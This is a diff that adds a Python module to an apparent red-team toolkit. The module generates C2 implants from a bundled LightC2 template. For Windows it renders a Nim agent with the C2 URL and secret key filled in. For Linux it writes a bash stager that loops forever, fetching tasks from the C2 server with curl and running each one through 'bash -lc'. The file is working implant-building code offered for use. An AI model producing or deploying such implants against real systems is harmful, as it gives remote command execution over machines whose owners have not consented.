@@ -1,0 +1,187 @@
+"""
+LightC2-backed payload generator.
+
+The original module attempted to use the third-party ``sliver`` Python package,
+which is not bundled with this toolkit and therefore fails to run out of the
+box.  This replacement reuses the bundled LightC2 agent template to generate
+payload artefacts without external dependencies.
+"""
+
+from __future__ import annotations
+
+import asyncio
+import json
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Any, Dict
+
+
+REPO_ROOT = Path(__file__).resolve().parent.parent
+DEFAULT_CONFIG_PATH = REPO_ROOT / "config" / "lightc2_agent_config.json"
+DEFAULT_PAYLOAD_DIR = REPO_ROOT / "payloads"
+LIGHTC2_TEMPLATE = REPO_ROOT / "tools" / "LightC2" / "raw_agents" / "Agent.nim"
+DEFAULT_USER_AGENT = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/122.0.0.0 Safari/537.36"
+)
+
+
+@dataclass
+class LightC2AgentConfig:
+    """Configuration required to build a LightC2 agent."""
+
+    c2_url: str
+    secret_key: str
+    sleep_interval: int = 5
+    user_agent: str = DEFAULT_USER_AGENT
+
+    @classmethod
+    def load(cls, path: Path = DEFAULT_CONFIG_PATH) -> "LightC2AgentConfig":
+        """
+        Load configuration from disk, creating a template file on first run.
+        """
+        if not path.exists():
+            path.parent.mkdir(parents=True, exist_ok=True)
+            default_payload = {
+                "c2_url": "https://127.0.0.1:8080/api/",
+                "secret_key": "CHANGE_ME",
+                "sleep_interval": 5,
+                "user_agent": DEFAULT_USER_AGENT,
+            }
+            path.write_text(json.dumps(default_payload, indent=2), encoding="utf-8")
+
+        data = json.loads(path.read_text(encoding="utf-8"))
+        return cls(
+            c2_url=data["c2_url"],
+            secret_key=data["secret_key"],
+            sleep_interval=int(data.get("sleep_interval", 5)),
+            user_agent=data.get("user_agent", DEFAULT_USER_AGENT),
+        )
+
+
+class LightC2AgentGenerator:
+    """Generate agent artefacts using the bundled LightC2 template."""
+
+    def __init__(self, config: LightC2AgentConfig, template_path: Path = LIGHTC2_TEMPLATE):
+        if not template_path.exists():
+            raise FileNotFoundError(f"LightC2 agent template missing: {template_path}")
+        self.config = config
+        self.template_path = template_path
+
+    def _render_nim_agent(self, name: str) -> str:
+        """Render the Nim agent with configuration placeholders replaced."""
+        template = self.template_path.read_text(encoding="utf-8")
+        replacements = {
+            "SECRET_KEY_PLACEHOLDER": self.config.secret_key,
+            "C2_URL_PLACEHOLDER": self.config.c2_url.rstrip("/") + "/",
+            "var sleep_time = 1": f"var sleep_time = {max(1, self.config.sleep_interval)}",
+        }
+
+        for placeholder, value in replacements.items():
+            template = template.replace(placeholder, value)
+
+        # Provide a deterministic identifier prefix to ease tracking.
+        template = template.replace(
+            "var identifier = $(int(rand(float(100000000000000000))))",
+            f'var identifier = "{name}-" & $(int(rand(float(100000000000000000))))',
+        )
+        return template
+
+    async def generate_implant(
+        self,
+        name: str,
+        target_os: str,
+        arch: str,
+        payload_format: str,
+        save_path: Path,
+    ) -> Dict[str, Any]:
+        """
+        Create a payload artefact and persist it to disk.
+
+        Currently the generator produces a Nim agent for Windows targets and a
+        bash-based stager for Linux targets. Additional formats can be layered
+        on later without reintroducing external dependencies.
+        """
+        target_os = target_os.lower()
+        payload_format = payload_format.lower()
+
+        if save_path.is_absolute():
+            resolved_path = save_path
+        else:
+            parts = save_path.parts
+            if parts and parts[0] == DEFAULT_PAYLOAD_DIR.name:
+                resolved_path = REPO_ROOT / save_path
+            else:
+                resolved_path = DEFAULT_PAYLOAD_DIR / save_path
+        save_path = resolved_path
+        save_path.parent.mkdir(parents=True, exist_ok=True)
+
+        if target_os == "windows":
+            content = self._render_nim_agent(name)
+            if save_path.suffix.lower() != ".nim":
+                save_path = save_path.with_suffix(".nim")
+            resolved_format = "nim"
+        elif target_os == "linux":
+            if payload_format not in {"sh", "bash"}:
+                save_path = save_path.with_suffix(".sh")
+                resolved_format = "sh"
+            else:
+                resolved_format = payload_format
+            base_url = self.config.c2_url.rstrip("/")
+            content = "\n".join(
+                [
+                    "#!/usr/bin/env bash",
+                    "# Lightweight tasking loop generated by LightC2AgentGenerator",
+                    "set -euo pipefail",
+                    f"C2_URL='{base_url}'",
+                    f"SECRET='{self.config.secret_key}'",
+                    "",
+                    "fetch_command() {",
+                    "  curl -fsSk -H \"X-Auth: ${SECRET}\" \"${C2_URL}/command\" || true",
+                    "}",
+                    "",
+                    "while true; do",
+                    "  task=\"$(fetch_command)\"",
+                    "  if [[ -n \"$task\" && \"$task\" != \"null\" ]]; then",
+                    "    bash -lc \"$task\"",
+                    "  fi",
+                    f"  sleep {max(1, self.config.sleep_interval)}",
+                    "done",
+                ]
+            )
+        else:
+            raise ValueError(f"Unsupported target OS: {target_os}")
+
+        save_path.write_text(content, encoding="utf-8")
+        return {
+            "name": name,
+            "path": str(save_path),
+            "target_os": target_os,
+            "arch": arch,
+            "format": resolved_format,
+            "bytes_written": len(content.encode("utf-8")),
+        }
+
+
+async def main() -> None:
+    """Entrypoint used when invoking the module as a script."""
+    config = LightC2AgentConfig.load()
+    generator = LightC2AgentGenerator(config)
+
+    payload_info = await generator.generate_implant(
+        name="lightc2-agent",
+        target_os="windows",
+        arch="amd64",
+        payload_format="nim",
+        save_path=Path("lightc2_agent"),
+    )
+
+    print(
+        "Generated payload:",
+        json.dumps(payload_info, indent=2),
+    )
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
